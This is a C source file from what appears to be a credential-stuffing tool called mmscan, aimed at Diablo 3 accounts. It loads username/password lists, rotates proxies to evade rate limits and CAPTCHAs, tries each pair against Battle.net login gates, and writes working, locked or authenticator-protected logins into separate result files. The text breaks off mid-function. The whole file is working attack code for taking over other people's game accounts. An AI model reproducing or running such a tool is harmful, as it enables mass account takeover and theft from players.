#include "mmscan_diablo3.h"

static pmmscan_param_diablo3 _mmscan_param_diablo3_create();
static int _mmscan_param_diablo3_reset( pmmscan_param_diablo3 pst_param );
static int _mmscan_param_diablo3_destroy( pmmscan_param_diablo3 pst_param );
static int _mmscan_param_diablo3_initializedirectory( pmmscan_param_diablo3 pst_param );
static int _mmscan_param_diablo3_saveaccountinfo( pmmscan_param_diablo3 pst_param );
static int _mmscan_param_diablo3_loadaccountinfo( pmmscan_param_diablo3 pst_param, const char* pcstr_file );
static int _mmscan_param_diablo3_loadproxyinfo( pmmscan_param_diablo3 pst_param, const char* pcstr_file );
static int _mmscan_param_diablo3_loadhttpproxyinfo( pmmscan_param_diablo3 pst_param, const char* pcstr_file );
static int _mmscan_param_diablo3_loadlocalproxyinfo( pmmscan_param_diablo3 pst_param );
static int _mmscan_param_diablo3_loadlogingateinfo( pmmscan_param_diablo3 pst_param, const char* pcstr_file );
static int _mmscan_param_diablo3_iterateaccountinfo( pmmscan_param_diablo3 pst_param, unsigned int* pun_idx );
static int _mmscan_param_diablo3_iterateproxyinfo( pmmscan_param_diablo3 pst_param, unsigned int* pun_idx );
static int _mmscan_param_diablo3_iteratelogingateinfo( pmmscan_param_diablo3 pst_param, unsigned int* pun_idx );
static pmmscan_accountinfo_diablo3 _mmscan_param_diablo3_getaccountinfo( pmmscan_param_diablo3 pst_param, unsigned int un_idx );
static pmmscan_proxyinfo_diablo3 _mmscan_param_diablo3_getproxyinfo( pmmscan_param_diablo3 pst_param, unsigned int un_idx );
static pmmscan_logingateinfo_diablo3 _mmscan_param_diablo3_getlogingateinfo( pmmscan_param_diablo3 pst_param, unsigned int un_idx );
static int _mmscan_param_diablo3_readline( pmmscan_param_diablo3 pst_param, FILE* pst_file, char* p_buffer, unsigned int* pun_bufferlen );
static int _mmscan_param_diablo3_rmfile( pmmscan_param_diablo3 pst_param, const char* pcstr_file );

static int _mmscan_diablo3_workrun( pmmscan pst_scan, void* p_param, void* p_extraspace, unsigned int un_workid );
static int _mmscan_diablo3_scan( pmmscan pst_scan, pmmscan_param_diablo3 pst_param, pmmscan_work_param_diablo3 pst_work_param, unsigned int un_workid );
static int _mmscan_diablo3_parse_pagelogin( const char* pcstr_page, unsigned int un_len );
static int _mmscan_diablo3_parse_pageloginresult( const char* pcstr_page, unsigned int un_len );
static size_t _mmscan_diablo3_scan_pagewriter( void* p_data, size_t size, size_t nmemb, void* userp );
static size_t _mmscan_diablo3_scan_pageheaderwriter( void* p_data, size_t size, size_t nmemb, void* userp );

static int _mmscan_diablo3_process_freework( pmmscan pst_scan, pmmscan_param_diablo3 pst_param, pmmscan_work pst_work, unsigned int un_ai_idx, unsigned int un_pi_idx, unsigned int un_li_idx );
static int _mmscan_diablo3_process_finishwork( pmmscan pst_scan, pmmscan_param_diablo3 pst_param, pmmscan_work pst_work );

static pmmscan_param_diablo3 _mmscan_param_diablo3_create()
{
    int n_result = 0;
    pmmscan_param_diablo3 pst_param = NULL;

    handle_error( pst_param = (pmmscan_param_diablo3)calloc( 1, sizeof(mmscan_param_diablo3) ) );
    pst_param->un_ai_again_count = 0;
    pst_param->un_ai_count = 0;
    pst_param->un_ai_cur = 0;
    pst_param->un_ai_count_finish = 0;
    pst_param->un_ai_count_iterate = 0;
    pst_param->un_pi_count = 0;
    pst_param->un_pi_cur = 0;
    pst_param->un_pi_flag_iterate = 0;
    pst_param->un_li_count = 0;
    pst_param->un_li_cur = 0;
    pst_param->pst_file_auth = NULL;
    pst_param->pst_file_error = NULL;
    pst_param->pst_file_lock = NULL;
    pst_param->pst_file_ok = NULL;
    pst_param->pst_file_unscan = NULL;
    pst_param->pst_file_validation = NULL;
    pst_param->pst_file_agreement = NULL;
    pst_param->pst_file_unknown = NULL;

    n_result = 1;
errorexit:
    if (  0 == n_result )
    {
        if ( pst_param )
        {
            _mmscan_param_diablo3_destroy( pst_param );
            pst_param = NULL;
        }
    }
    return pst_param;
}

static int _mmscan_param_diablo3_reset( pmmscan_param_diablo3 pst_param )
{
    int n_result = 0;
    unsigned int un_i = 0;

    assert( pst_param );
    for ( un_i = 0; un_i < pst_param->un_ai_count; un_i++ )
    {
        assert( pst_param->apst_ai[un_i] );
        free( pst_param->apst_ai[un_i] );
    }
    for ( un_i = 0; un_i < pst_param->un_pi_count; un_i++)
    {
        assert( pst_param->apst_pi[un_i] );
        free( pst_param->apst_pi[un_i] );
    }
    for ( un_i = 0; un_i < pst_param->un_li_count; un_i++ )
    {
        assert( pst_param->apst_li[un_i] );
        free( pst_param->apst_li[un_i] );
    }
    pst_param->un_ai_count = 0;
    pst_param->un_pi_count = 0;
    pst_param->un_li_count = 0;
    pst_param->un_ai_cur = 0;
    pst_param->un_pi_cur = 0;
    pst_param->un_li_cur = 0;

    n_result = 1;
/* errorexit: */
    return n_result;
}

static int _mmscan_param_diablo3_destroy( pmmscan_param_diablo3 pst_param )
{
    int n_result = 0;

    assert( pst_param );
    handle_error( _mmscan_param_diablo3_reset( pst_param ) );
    free( pst_param );
    pst_param = NULL;

    n_result = 1;
errorexit:
    return n_result;
}

static int _mmscan_param_diablo3_initializedirectory( pmmscan_param_diablo3 pst_param )
{
    int n_result = 0;
    BOOL b_result_create = FALSE;

    assert( pst_param );
    b_result_create = CreateDirectoryA( MMSCAN_DIRECTORY_RESULT, NULL );
    if ( b_result_create == FALSE )
    {
        handle_error( GetLastError() == ERROR_ALREADY_EXISTS );
    }
    handle_error( pst_param->pst_file_ok = fopen( MMSCAN_RESULT_ACCOUNT_OK, "wb" ) );
    handle_error( pst_param->pst_file_error = fopen( MMSCAN_RESULT_ACCOUNT_ERROR, "wb" ) );
    handle_error( pst_param->pst_file_auth = fopen( MMSCAN_RESULT_ACCOUNT_AUTH, "wb" ) );
    handle_error( pst_param->pst_file_lock = fopen( MMSCAN_RESULT_ACCOUNT_LOCK, "wb" ) );
    handle_error( pst_param->pst_file_unscan = fopen( MMSCAN_RESULT_ACCOUNT_UNSCAN, "wb" ) );
    handle_error( pst_param->pst_file_validation = fopen( MMSCAN_RESULT_ACCOUNT_VALIDATION, "wb" ) );
    handle_error( pst_param->pst_file_agreement = fopen( MMSCAN_RESULT_ACCOUNT_AGREEMENT, "wb" ) );
    handle_error( pst_param->pst_file_unknown = fopen( MMSCAN_RESULT_ACCOUNT_UNKNOWN, "wb" ) );

    n_result = 1;
errorexit:
    return n_result;
}

static int _mmscan_param_diablo3_saveaccountinfo( pmmscan_param_diablo3 pst_param )
{
    int n_result = 0;
    FILE* pst_file_dest = NULL;
    unsigned int un_i = 0;

    assert( pst_param );

    for ( un_i = 0; un_i < pst_param->un_ai_count; un_i++ )
    {
        assert( pst_param->apst_ai[un_i] );
        switch( pst_param->apst_ai[un_i]->n_state )
        {
        case MMSCAN_ACCOUNTINFO_STATE_SCANNED_OK_DIABLO3:
            pst_file_dest = pst_param->pst_file_ok;
            break;
        case MMSCAN_ACCOUNTINFO_STATE_SCANNED_PASSWD_ERROR_DIABLO3:
            pst_file_dest = pst_param->pst_file_error;
            break;
        case MMSCAN_ACCOUNTINFO_STATE_SCANNED_AUTH_ERROR_DIABLO3:
            pst_file_dest = pst_param->pst_file_auth;
            break;
        case MMSCAN_ACCOUNTINFO_STATE_SCANNED_LOCK_ERROR_DIABLO3:
            pst_file_dest = pst_param->pst_file_lock;
            break;
        case MMSCAN_ACCOUNTINFO_STATE_UNSCAN_DIABLO3:
        case MMSCAN_ACCOUNTINFO_STATE_UNSCAN_SECURITYCODE_ERROR_DIABLO3:
        case MMSCAN_ACCOUNTINFO_STATE_UNSCAN_PROXY_ERROR_DIABLO3:
            pst_file_dest = pst_param->pst_file_unscan;
            break;
        case MMSCAN_ACCOUNTINFO_STATE_SCANNED_LOGGED_DIABLO3:
            break;
        default:
            assert( 0 );
        }

        fwrite( pst_param->apst_ai[un_i]->ac_account, strlen( pst_param->apst_ai[un_i]->ac_account ), 1, pst_file_dest );
        fwrite( " ", 1, 1, pst_file_dest );
        fwrite( pst_param->apst_ai[un_i]->ac_password, strlen( pst_param->apst_ai[un_i]->ac_password ), 1, pst_file_dest );
        fwrite( "\r\n", 2, 1, pst_file_dest );
    }

    n_result = 1;
/* errorexit: */
    if ( pst_param->pst_file_unscan )
    {
        fclose( pst_param->pst_file_unscan );
        pst_param->pst_file_unscan = NULL;
    }
    if ( pst_param->pst_file_lock )
    {
        fclose( pst_param->pst_file_lock );
        pst_param->pst_file_lock = NULL;
    }
    if ( pst_param->pst_file_auth )
    {
        fclose( pst_param->pst_file_auth );
        pst_param->pst_file_auth = NULL;
    }
    if ( pst_param->pst_file_error )
    {
        fclose( pst_param->pst_file_error );
        pst_param->pst_file_error = NULL;
    }
    if ( pst_param->pst_file_ok )
    {
        fclose( pst_param->pst_file_ok );
        pst_param->pst_file_ok = NULL;
    }
    if ( pst_param->pst_file_validation )
    {
        fclose( pst_param->pst_file_validation );
        pst_param->pst_file_validation = NULL;
    }
    if ( pst_param->pst_file_agreement )
    {
        fclose( pst_param->pst_file_agreement );
        pst_param->pst_file_agreement = NULL;
    }
    if ( pst_param->pst_file_unknown )
    {
        fclose( pst_param->pst_file_unknown );
        pst_param->pst_file_unknown = NULL;
    }
    return n_result;
}

static int _mmscan_param_diablo3_loadaccountinfo( pmmscan_param_diablo3 pst_param, const char* pcstr_file )
{
    int n_result = 0;
    FILE* pst_file = NULL;
    char ac_buffer[1024] = { 0 };
    unsigned int un_bufferlen = 0;
    char* pc_blank = NULL;
    pmmscan_accountinfo_diablo3 pst_ai = NULL;

    assert( pst_param );
    assert( pcstr_file );
    handle_error( pst_file = fopen( pcstr_file, "rb" ) );
    while ( 1 )
    {
        un_bufferlen = 1024;
        handle_error( _mmscan_param_diablo3_readline( pst_param, pst_file, ac_buffer, &un_bufferlen ) );
        if ( un_bufferlen <= 0 )
        {
            break;
        }
        pc_blank = strstr( ac_buffer, " " );
        if ( NULL == pc_blank )
        {
            continue;
        }
        *pc_blank = 0;
        handle_error( pst_ai = (pmmscan_accountinfo_diablo3)calloc( 1, sizeof(mmscan_accountinfo_diablo3) ) );
        strncpy( pst_ai->ac_account, ac_buffer, MMSCAN_DIABLO3_ACCOUNT_LEN );
        pst_ai->ac_account[MMSCAN_DIABLO3_ACCOUNT_LEN-1] = 0;
        strncpy( pst_ai->ac_password, pc_blank+1, MMSCAN_DIABLO3_PASSWORD_LEN );
        pst_ai->ac_password[MMSCAN_DIABLO3_PASSWORD_LEN-1] = 0;
        pst_ai->n_state = MMSCAN_ACCOUNTINFO_STATE_UNSCAN_DIABLO3;
        pst_param->apst_ai[pst_param->un_ai_count++] = pst_ai;
    }

    n_result = 1;
errorexit:
    return n_result;
}

static int _mmscan_param_diablo3_loadproxyinfo( pmmscan_param_diablo3 pst_param, const char* pcstr_file )
{
    int n_result = 0;
    FILE* pst_file = NULL;
    char ac_buffer[1024] = { 0 };
    unsigned int un_bufferlen = 0;
    char* pc_blank = NULL;
    pmmscan_proxyinfo_diablo3 pst_pi = NULL;

    assert( pst_param );
    assert( pcstr_file );
    handle_error( pst_file = fopen( pcstr_file, "rb" ) );
    while ( 1 )
    {
        un_bufferlen = 1024;
        handle_error( _mmscan_param_diablo3_readline( pst_param, pst_file, ac_buffer, &un_bufferlen ) );
        if ( un_bufferlen <= 0 )
        {
            break;
        }
        pc_blank = strstr( ac_buffer, " " );
        if ( NULL == pc_blank )
        {
            continue;
        }
        *pc_blank = 0;
        handle_error( pst_pi = (pmmscan_proxyinfo_diablo3)calloc( 1, sizeof(mmscan_proxyinfo_diablo3) ) );
        strncpy( pst_pi->ac_ip, ac_buffer, MMSCAN_DIABLO3_IP_LEN );
        pst_pi->ac_ip[MMSCAN_DIABLO3_IP_LEN-1] = 0;
        pst_pi->us_port = (unsigned short)atoi( pc_blank+1 );
        pst_pi->n_state = MMSCAN_PROXYINFO_STATE_OK_DIABLO3;
        pst_pi->n_type = MMSCAN_PROXYINFO_TYPE_PROXY;
        pst_param->apst_pi[pst_param->un_pi_count++] = pst_pi;
    }

    n_result = 1;
errorexit:
    return n_result;
}

static int _mmscan_param_diablo3_loadhttpproxyinfo( pmmscan_param_diablo3 pst_param, const char* pcstr_file )
{
    int n_result = 0;
    FILE* pst_file = NULL;
    char ac_buffer[1024] = { 0 };
    unsigned int un_bufferlen = 0;
    char* pc_field = NULL;
    char* pc_fieldend = NULL;
    pmmscan_proxyinfo_diablo3 pst_pi = NULL;

    assert( pst_param );
    assert( pcstr_file );
    handle_error( pst_file = fopen( pcstr_file, "rb" ) );
    while ( 1 )
    {
        un_bufferlen = 1024;
        handle_error( _mmscan_param_diablo3_readline( pst_param, pst_file, ac_buffer, &un_bufferlen ) );
        if ( un_bufferlen <= 0 )
        {
            break;
        }
        pc_field = ac_buffer;

        handle_error( pst_pi = (pmmscan_proxyinfo_diablo3)calloc( 1, sizeof(mmscan_proxyinfo_diablo3) ) );

        handle_error( pc_fieldend = strstr( pc_field, " " ) );
        *pc_fieldend = 0;
        strncpy( pst_pi->ac_ip, pc_field, MMSCAN_DIABLO3_IP_LEN );
        pst_pi->ac_ip[MMSCAN_DIABLO3_IP_LEN-1] = 0;

        pc_field = pc_fieldend+1;
        pc_fieldend = strstr( pc_field, " " );
        if ( !pc_fieldend )
        {
            handle_error( strlen( pc_field ) > 0 );
            pst_pi->us_port = (unsigned short)atoi( pc_field );
            goto loadexit;
        }
        else
        {
            *pc_fieldend = 0;
            pst_pi->us_port = (unsigned short)atoi( pc_field );
        }

        pc_field = pc_fieldend+1;
        pc_fieldend = strstr( pc_field, " " );
        if ( !pc_fieldend )
        {
            goto loadexit;
        }
        *pc_fieldend = 0;
        strncpy( pst_pi->ac_username, pc_field, MMSCAN_DIABLO3_PROXYUSERNAME_LEN );
        pst_pi->ac_username[MMSCAN_DIABLO3_PROXYUSERNAME_LEN-1] = 0;

        pc_field = pc_fieldend+1;
        if ( strlen(pc_field) <= 0 )
        {
            goto loadexit;
        }
        strncpy( pst_pi->ac_password, pc_field, MMSCAN_DIABLO3_PROXYPASSWORD_LEN );
        pst_pi->ac_password[MMSCAN_DIABLO3_PROXYPASSWORD_LEN-1] = 0;

loadexit:
        pst_pi->n_state = MMSCAN_PROXYINFO_STATE_OK_DIABLO3;
        pst_pi->n_type = MMSCAN_PROXYINFO_TYPE_HTTPPROXY;
        pst_param->apst_pi[pst_param->un_pi_count++] = pst_pi;
    }

    n_result = 1;
errorexit:
    return n_result;
}

static int _mmscan_param_diablo3_loadlocalproxyinfo( pmmscan_param_diablo3 pst_param )
{
    int n_result = 0;
    unsigned long ul_ip = 0;
    unsigned short us_port = 0;
    char ac_hostname[256] = { 0 };
    struct hostent* pst_host = NULL;
    struct in_addr c_addr = { 0 };
    char* pstr_ip = NULL;
    int i = 0;
    char ac_url[256] = { 0 };
    pmmscan_proxyinfo_diablo3 pst_pi = NULL;

    gethostname( ac_hostname, 256 );
    handle_error( pst_host = gethostbyname( ac_hostname ) );
    while( pst_host->h_addr_list[i] )
    {
        c_addr.S_un.S_addr = *((unsigned long*)pst_host->h_addr_list[i]);
        pstr_ip = inet_ntoa( c_addr );

        i++;
        /*判断是否内网ip*/
        if ( strncmp( pstr_ip, "127.0.0.1", strlen("127.0.0.1") ) == 0 )
        {
            continue;
        }
        if ( strncmp( pstr_ip, "10.", strlen( "10." ) ) == 0 )
        {
            continue;
        }
        if ( strncmp( pstr_ip, "172.16", strlen( "172.16" ) ) == 0 )
        {
            continue;
        }
        if ( strncmp ( pstr_ip, "192.168", strlen( "192.168" ) ) == 0 )
        {
            continue;
        }
        printf( "发现本地外网Ip:%s\n", pstr_ip );

        handle_error( pst_pi = (pmmscan_proxyinfo_diablo3)calloc( 1, sizeof(mmscan_proxyinfo_diablo3) ) );
        strncpy( pst_pi->ac_ip, pstr_ip, MMSCAN_DIABLO3_IP_LEN );
        pst_pi->ac_ip[MMSCAN_DIABLO3_IP_LEN-1];
        pst_pi->us_port = 0;
        pst_pi->n_state = MMSCAN_PROXYINFO_STATE_OK_DIABLO3;
        pst_pi->n_type = MMSCAN_PROXYINFO_TYPE_LOCAL;
        pst_param->apst_pi[pst_param->un_pi_count++] = pst_pi;
    }

    n_result = 1;
errorexit:
    return n_result;
}

static int _mmscan_param_diablo3_loadlogingateinfo( pmmscan_param_diablo3 pst_param, const char* pcstr_file )
{
    int n_result = 0;
    FILE* pst_file = NULL;
    char ac_buffer[1024] = { 0 };
    unsigned int un_bufferlen = 0;
    char* pc_blank = NULL;
    pmmscan_logingateinfo_diablo3 pst_li = NULL;

    assert( pst_param );
    assert( pcstr_file );
    handle_error( pst_file = fopen( pcstr_file, "rb" ) );
    while ( 1 )
    {
        un_bufferlen = 1024;
        handle_error( _mmscan_param_diablo3_readline( pst_param, pst_file, ac_buffer, &un_bufferlen ) );
        if ( un_bufferlen <= 0 )
        {
            break;
        }
        pc_blank = strstr( ac_buffer, " " );
        if ( NULL == pc_blank )
        {
            continue;
        }
        *pc_blank = 0;
        handle_error( pst_li = (pmmscan_logingateinfo_diablo3)calloc( 1, sizeof(mmscan_logingateinfo_diablo3) ) );
        strncpy( pst_li->ac_loginurl, ac_buffer, MMSCAN_DIABLO3_URL_LEN );
        pst_li->ac_loginurl[MMSCAN_DIABLO3_IP_LEN-1];
        strncpy( pst_li->ac_loginhost, pc_blank + 1, MMSCAN_DIABLO3_URL_LEN );
        pst_li->ac_loginhost[MMSCAN_DIABLO3_IP_LEN-1];
        pst_param->apst_li[pst_param->un_li_count++] = pst_li;
    }

    n_result = 1;
errorexit:
    return n_result;
}

static int _mmscan_param_diablo3_iterateaccountinfo( pmmscan_param_diablo3 pst_param, unsigned int* pun_idx )
{
    int n_result = 0;
    int n_state = 0;

    assert( pst_param );
    assert( pun_idx );
    if ( pst_param->un_ai_again_count > 0 )
    {
        n_state = pst_param->apst_ai[pst_param->aun_ai_again[pst_param->un_ai_again_count-1]]->n_state;
        if ( n_state == MMSCAN_ACCOUNTINFO_STATE_UNSCAN_DIABLO3 || n_state == MMSCAN_ACCOUNTINFO_STATE_UNSCAN_PROXY_ERROR_DIABLO3
            || n_state == MMSCAN_ACCOUNTINFO_STATE_UNSCAN_SECURITYCODE_ERROR_DIABLO3 )
        {
            *pun_idx = pst_param->aun_ai_again[--pst_param->un_ai_again_count];
            pst_param->un_ai_count_iterate++;
            if ( pst_param->un_ai_count_iterate >= 15 )
            {
                pst_param->un_pi_flag_iterate = 1;
                pst_param->un_ai_count_iterate = 0;
            }
            handle_succ( 1 );
        }
    }
    if ( pst_param->un_ai_cur >= pst_param->un_ai_count )
    {
        *pun_idx = -1;
        handle_succ( 1 );
    }
    n_state = pst_param->apst_ai[pst_param->un_ai_cur]->n_state;
    assert( n_state == MMSCAN_ACCOUNTINFO_STATE_UNSCAN_DIABLO3 );
    *pun_idx = pst_param->un_ai_cur++;
    pst_param->un_ai_count_iterate++;
    if ( pst_param->un_ai_count_iterate >= 15 )
    {
        pst_param->un_pi_flag_iterate = 1;
        pst_param->un_ai_count_iterate = 0;
    }

succexit:
    n_result = 1;
/* errorexit: */
    return n_result;
}

static int _mmscan_param_diablo3_iterateproxyinfo( pmmscan_param_diablo3 pst_param, unsigned int* pun_idx )
{
    int n_result = 0;
    int n_state = 0;
    unsigned int un_count_find = 0;


    assert( pst_param );
    assert( pun_idx );
    if ( pst_param->un_pi_count <= 0 )
    {
        *pun_idx = -1;
        handle_succ( 1 );
    }
    if ( pst_param->un_pi_cur >= pst_param->un_pi_count )
    {
        pst_param->un_pi_cur = 0;
    }
    n_state = pst_param->apst_pi[pst_param->un_pi_cur]->n_state;
    *pun_idx = pst_param->un_pi_cur;
    if ( pst_param->un_pi_flag_iterate == 1 )
    {
        pst_param->un_pi_cur++;
        pst_param->un_pi_flag_iterate = 0;
    }

succexit:
    n_result = 1;
/* errorexit: */
    return n_result;
}

static int _mmscan_param_diablo3_iteratelogingateinfo( pmmscan_param_diablo3 pst_param, unsigned int* pun_idx )
{
    int n_result = 0;

    assert( pst_param );
    assert( pun_idx );

    if ( pst_param->un_li_count <= 0 )
    {
        *pun_idx = -1;
        handle_succ( 1 );
    }
    if ( pst_param->un_li_cur >= pst_param->un_li_count )
    {
        pst_param->un_li_cur = 0;
    }
    *pun_idx = pst_param->un_li_cur++;

succexit:
    n_result = 1;
/* errorexit: */
    return n_result;
}

int _mmscan_param_diablo3_readline( pmmscan_param_diablo3 pst_param, FILE* pst_file, char* p_buffer, unsigned int* pun_bufferlen )
{
    int n_result = 0;
    int n_read = 0;
    unsigned int un_len = 0;

    assert( pst_param );
    assert( pst_file );
    assert( p_buffer );
    assert( pun_bufferlen );
    while( 1 )
    {
        handle_error( un_len < *pun_bufferlen );
        n_read = fgetc( pst_file );
        if ( n_read == EOF )
        {
            break;
        }
        if ( n_read == '\n' )
        {
            break;
        }
        p_buffer[un_len++] = n_read;
    }
    if ( un_len > 0 )
    {
        if ( p_buffer[un_len-1] == '\r' )
        {
            p_buffer[un_len-1] = 0;
            un_len--;
        }
        else
        {
            p_buffer[un_len] = 0;
        }
    }
    else
    {
        p_buffer[un_len] = 0;
    }
    *pun_bufferlen = un_len;

    n_result = 1;
errorexit:
    return n_result;
}

static int _mmscan_param_diablo3_rmfile( pmmscan_param_diablo3 pst_param, const char* pcstr_file )
{
    int n_result = 0;
    BOOL b_ret_rm = FALSE;

    assert( pst_param );
    assert( pcstr_file );
    b_ret_rm = DeleteFileA( pcstr_file );
    if ( FALSE == b_ret_rm )
    {
        handle_error( ERROR_FILE_NOT_FOUND == GetLastError() );
    }

    n_result = 1;
errorexit:
    return n_result;
}

static pmmscan_accountinfo_diablo3 _mmscan_param_diablo3_getaccountinfo( pmmscan_param_diablo3 pst_param, unsigned int un_idx )
{
    pmmscan_accountinfo_diablo3 pst_ai = NULL;

    assert( pst_param );
    handle_error( un_idx < pst_param->un_ai_count );
    handle_error( pst_ai = pst_param->apst_ai[un_idx] );

errorexit:
    return pst_ai;
}

static pmmscan_proxyinfo_diablo3 _mmscan_param_diablo3_getproxyinfo( pmmscan_param_diablo3 pst_param, unsigned int un_idx )
{
    pmmscan_proxyinfo_diablo3 pst_pi = NULL;

    assert( pst_param );
    handle_error( un_idx < pst_param->un_pi_count );
    handle_error( pst_pi = pst_param->apst_pi[un_idx] );

errorexit:
    return pst_pi;
}

static pmmscan_logingateinfo_diablo3 _mmscan_param_diablo3_getlogingateinfo( pmmscan_param_diablo3 pst_param, unsigned int un_idx )
{
    pmmscan_logingateinfo_diablo3 pst_li = NULL;

    assert( pst_param );
    handle_error( un_idx < pst_param->un_li_count );
    handle_error( pst_li = pst_param->apst_li[un_idx] );

errorexit:
    return pst_li;
}

static int _mmscan_diablo3_process_freework( pmmscan pst_scan, pmmscan_param_diablo3 pst_param, pmmscan_work pst_work, unsigned int un_ai_idx, unsigned int un_pi_idx, unsigned int un_li_idx )
{
    int n_result = 0;
    pmmscan_work_param_diablo3 pst_work_param = NULL;

    handle_error( mmscan_work_setrunfunc( pst_work, _mmscan_diablo3_workrun ) );
    handle_error( pst_work_param = (pmmscan_work_param_diablo3)mmscan_work_allocextraspace( pst_work, sizeof(mmscan_work_param_diablo3) ) );
    pst_work_param->n_result = MMSCAN_WORK_PARAM_RESULT_ERROR;
    pst_work_param->un_idx_logingateinfo = un_li_idx;
    pst_work_param->un_idx_accountinfo = un_ai_idx;
    pst_work_param->un_idx_proxyinfo = un_pi_idx;

    n_result = 1;
errorexit:
    return n_result;
}

static int _mmscan_diablo3_process_finishwork( pmmscan pst_scan, pmmscan_param_diablo3 pst_param, pmmscan_work pst_work )
{
    int n_result = 0;
    pmmscan_work_param_diablo3 pst_work_param = NULL;
    pmmscan_accountinfo_diablo3 pst_ai = NULL;
    pmmscan_proxyinfo_diablo3 pst_pi = NULL;
    pmmscan_logingateinfo_diablo3 pst_li = NULL;
    
    assert( pst_scan );
    assert( pst_param );
    assert( pst_work );
    handle_error( pst_work_param = (pmmscan_work_param_diablo3)mmscan_work_getextraspace( pst_work, sizeof(mmscan_work_param_diablo3) ) );
    handle_error( pst_li = _mmscan_param_diablo3_getlogingateinfo( pst_param, pst_work_param->un_idx_logingateinfo ) );
    handle_error( pst_ai = _mmscan_param_diablo3_getaccountinfo( pst_param, pst_work_param->un_idx_accountinfo ) );
    if ( -1 != pst_work_param->un_idx_proxyinfo )
    {
        handle_error( pst_pi = _mmscan_param_diablo3_getproxyinfo( pst_param, pst_work_param->un_idx_proxyinfo ) );
    }
    else
    {
        pst_pi = NULL;
    }
    switch( pst_work_param->n_result )
    {
    case MMSCAN_WORK_PARAM_RESULT_OK:
        printf( "账号[%s] 登陆成功!!\n", pst_ai->ac_account );
        pst_ai->n_state = MMSCAN_ACCOUNTINFO_STATE_SCANNED_LOGGED_DIABLO3;
        fwrite( pst_ai->ac_account, strlen( pst_ai->ac_account ), 1, pst_param->pst_file_ok );
        fwrite( " ", 1, 1, pst_param->pst_file_ok );
        fwrite( pst_ai->ac_password, strlen( pst_ai->ac_password ), 1, pst_param->pst_file_ok );
        fwrite( "\r\n", 2, 1, pst_param->pst_file_ok );
        fflush( pst_param->pst_file_ok );
        pst_param->un_ai_count_finish++;
        break;
    case MMSCAN_WORK_PARAM_RESULT_AUTH_ERROR:
        printf( "账号[%s] 登陆成功!! 但是需要动态码\n", pst_ai->ac_account );
        pst_ai->n_state = MMSCAN_ACCOUNTINFO_STATE_SCANNED_LOGGED_DIABLO3;
        fwrite( pst_ai->ac_account, strlen( pst_ai->ac_account ), 1, pst_param->pst_file_auth );
        fwrite( " ", 1, 1, pst_param->pst_file_auth );
        fwrite( pst_ai->ac_password, strlen( pst_ai->ac_password ), 1, pst_param->pst_file_auth );
        fwrite( "\r\n", 2, 1, pst_param->pst_file_auth );
        fflush( pst_param->pst_file_auth );
        pst_param->un_ai_count_finish++;
        break;
    case MMSCAN_WORK_PARAM_RESULT_LOCK_ERROR:
        printf( "账号[%s] 登陆成功!! 但是已经被锁定\n", pst_ai->ac_account );
        pst_ai->n_state = MMSCAN_ACCOUNTINFO_STATE_SCANNED_LOGGED_DIABLO3;
        fwrite( pst_ai->ac_account, strlen( pst_ai->ac_account ), 1, pst_param->pst_file_lock );
        fwrite( " ", 1, 1, pst_param->pst_file_lock );
        fwrite( pst_ai->ac_password, strlen( pst_ai->ac_password ), 1, pst_param->pst_file_lock );
        fwrite( "\r\n", 2, 1, pst_param->pst_file_lock );
        fflush( pst_param->pst_file_lock );
        pst_param->un_ai_count_finish++;
        break;
    case MMSCAN_WORK_PARAM_RESULT_VALIDATION_ERROR:
        printf( "账号[%s] 登陆成功!! 但是需要验证邮箱\n", pst_ai->ac_account );
        pst_ai->n_state = MMSCAN_ACCOUNTINFO_STATE_SCANNED_LOGGED_DIABLO3;
        fwrite( pst_ai->ac_account, strlen( pst_ai->ac_account ), 1, pst_param->pst_file_validation );
        fwrite( " ", 1, 1, pst_param->pst_file_validation );
        fwrite( pst_ai->ac_password, strlen( pst_ai->ac_password ), 1, pst_param->pst_file_validation );
        fwrite( "\r\n", 2, 1, pst_param->pst_file_validation );
        fflush( pst_param->pst_file_validation );
        pst_param->un_ai_count_finish++;
        break;
    case MMSCAN_WORK_PARAM_RESULT_AGREEMENT_ERROR:
        printf( "账号[%s] 登陆成功!! 但是需要通过申明\n", pst_ai->ac_account );
        pst_ai->n_state = MMSCAN_ACCOUNTINFO_STATE_SCANNED_LOGGED_DIABLO3;
        fwrite( pst_ai->ac_account, strlen( pst_ai->ac_account ), 1, pst_param->pst_file_agreement );
        fwrite( " ", 1, 1, pst_param->pst_file_agreement );
        fwrite( pst_ai->ac_password, strlen( pst_ai->ac_password ), 1, pst_param->pst_file_agreement );
        fwrite( "\r\n", 2, 1, pst_param->pst_file_agreement );
        fflush( pst_param->pst_file_agreement );
        pst_param->un_ai_count_finish++;
        break;
    case MMSCAN_WORK_PARAM_RESULT_UNKNOWN_ERROR:
        printf( "账号[%s] 登陆成功!! 但是需要验证邮箱\n", pst_ai->ac_account );
        pst_ai->n_state = MMSCAN_ACCOUNTINFO_STATE_SCANNED_LOGGED_DIABLO3;
        fwrite( pst_ai->ac_account, strlen( pst_ai->ac_account ), 1, pst_param->pst_file_unknown );
        fwrite( " ", 1, 1, pst_param->pst_file_unknown );
        fwrite( pst_ai->ac_password, strlen( pst_ai->ac_password ), 1, pst_param->pst_file_unknown );
        fwrite( "\r\n", 2, 1, pst_param->pst_file_unknown );
        fflush( pst_param->pst_file_unknown );
        pst_param->un_ai_count_finish++;
        break;
    case MMSCAN_WORK_PARAM_RESULT_USERPASS_ERROR:
        printf( "账号[%s] 登陆失败!! 用户名或密码错误\n", pst_ai->ac_account );
        pst_ai->n_state = MMSCAN_ACCOUNTINFO_STATE_SCANNED_LOGGED_DIABLO3;
        fwrite( pst_ai->ac_account, strlen( pst_ai->ac_account ), 1, pst_param->pst_file_error );
        fwrite( " ", 1, 1, pst_param->pst_file_error );
        fwrite( pst_ai->ac_password, strlen( pst_ai->ac_password ), 1, pst_param->pst_file_error );
        fwrite( "\r\n", 2, 1, pst_param->pst_file_error );
        fflush( pst_param->pst_file_error );
        pst_param->un_ai_count_finish++;
        break;
    case MMSCAN_WORK_PARAM_RESULT_SECURITYCODE_ERROR:
        printf( "账号[%s] 登陆失败!!, 出现验证码\n", pst_ai->ac_account );
        pst_ai->n_state = MMSCAN_ACCOUNTINFO_STATE_UNSCAN_SECURITYCODE_ERROR_DIABLO3;
        pst_pi->n_state = MMSCAN_PROXYINFO_STATE_SECURITECODE_ERROR_DIABLO3;
        pst_param->aun_ai_again[pst_param->un_ai_again_count++] = pst_work_param->un_idx_accountinfo;
        break;
    case MMSCAN_WORK_PARAM_RESULT_PROXY_ERROR:
